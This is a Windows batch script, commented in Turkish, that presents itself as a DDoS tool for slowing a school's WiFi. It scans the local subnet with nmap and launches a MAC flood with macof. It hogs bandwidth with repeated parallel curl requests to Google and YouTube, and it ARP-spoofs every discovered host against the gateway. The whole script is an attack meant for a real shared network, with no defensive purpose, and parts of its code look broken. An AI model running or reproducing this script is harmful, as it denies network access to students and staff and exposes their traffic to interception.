@echo off
:: wifi_flood.bat — Okul WiFi’de trafiği yoran DDoS (Windows)
:: Kullanım: Çift tıkla → çalışır (terminal açılmaz)

title WiFi Trafik Yoğunluğu | Okul DDoS
echo [START] Script baslatildi... >> "%TEMP%\wifi_flood.log"
echo [START] Kullanici: %USERNAME% >> "%TEMP%\wifi_flood.log"

:: --- Gerekli araçlari kontrol et ---
echo [CHECK] Gerekli araçlar kontrol ediliyor... >> "%TEMP%\wifi_flood.log"

where nmap >nul 2>&1 && (echo [OK] nmap bulunuyor >> "%TEMP%\wifi_flood.log") || (echo [WARN] nmap eksik >> "%TEMP%\wifi_flood.log")
where curl >nul 2>&1 && (echo [OK] curl bulunuyor >> "%TEMP%\wifi_flood.log") || (echo [WARN] curl eksik >> "%TEMP%\wifi_flood.log")

:: --- Hedefleri tespit et (nmap ile subnet taramasi) ---
set "SUBNET=192.168.1.0/24"
echo [SCAN] Hedef subnet: %SUBNET% >> "%TEMP%\wifi_flood.log"

if exist "%ProgramFiles%\Git\bin\bash.exe" (
    echo [INFO] Git Bash bulundu — %ProgramFiles%\Git\bin\bash.exe >> "%TEMP%\wifi_flood.log"
) else if exist "%ProgramFiles%\Git\bin\bash.exe" (
    echo [INFO] WSL/Bash bulunuyor... >> "%TEMP%\wifi_flood.log"
)

:: --- Bash scriptini calistir (ic ice bash) ---
echo [RUN] Bash scripti calistiriliyor... >> "%TEMP%\wifi_flood.log"

"%ProgramFiles%\Git\bin\bash.exe" -lc "
set -e
echo '[BASH] Bash moduna girildi' >> /tmp/wifi_flood.log

# Hedefleri tespit et
echo '[BASH] Hedefler tespit ediliyor...' >> /tmp/wifi_flood.log
nmap -sn %SUBNET% -oN /tmp/nmap_hosts.txt >/dev/null 2>&1 || echo '[WARN] nmap calismadi' >> /tmp/wifi_flood.log
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /tmp/nmap_hosts.txt | grep -v '^127\.' > /tmp/wifi_hosts.txt
COUNT=\$(wc -l < /tmp/wifi_hosts.txt)
echo '[OK] \$COUNT cihaz bulundu' >> /tmp/wifi_flood.log

# MAC flood (DHCP starv)
echo '[MAC] MAC flood baslatiliyor...' >> /tmp/wifi_flood.log
if command -v macof >/dev/null 2>&1; then
    macof -n 2000 &
fi

# Bandwidth hogging (HTTP trafiği yorma)
echo '[HTTP] Bandwidth hogging baslatiliyor...' >> /tmp/wifi_flood.log
for i in {1..30}; do
    curl -sSf 'https://www.google.com/search?q=okul+wifi+\$RANDOM' &
    curl -sSf 'https://www.youtube.com/results?search_query=okul+dersleri+\$RANDOM' &
done

# ARP flood
echo '[ARP] ARP flood baslatiliyor...' >> /tmp/wifi_flood.log
while read -r ip; do
    [[ \$ip == '127.0.0.1' || \$ip == '192.168.1.1' ]] && continue
    timeout 120 arpspoof -t \$ip 192.168.1.1 &
    timeout 120 arpspoof -t 192.168.1.1 \$ip &
done < /tmp/wifi_hosts.txt

# Bekle
echo '[WAIT] Flood 2 dakika boyunca devam edecek...' >> /tmp/wifi_flood.log
sleep 120

echo '[DONE] Trafik yoğuşması tamamlandı.' >> /tmp/wifi_flood.log
" 2>&1 >> "%TEMP%\wifi_flood.log"

:: --- Sonuç mesajı (GUI olarak popup) ---
echo [FINISH] Script bitti. Internet yavaşlamış olabilir. >> "%TEMP%\wifi_flood.log"
echo [FINISH] Log: %TEMP%\wifi_flood.log >> "%TEMP%\wifi_flood.log"

:: Popup mesaj (PowerShell ile GUI)
powershell -Command "
    Add-Type -AssemblyName System.Windows.Forms
    $msg = 'WiFi Trafik Yoğunluğu Tamamlandı!%n%nLog: %TEMP%\wifi_flood.log'
    [System.Windows.Forms.MessageBox]::Show('Trafik yoğunluğu tamamlandı. Internet yavaşlamış olabilir.', 'WiFi DDoS', 0, 64)
"

echo [OK] Tamamlandı.
pause
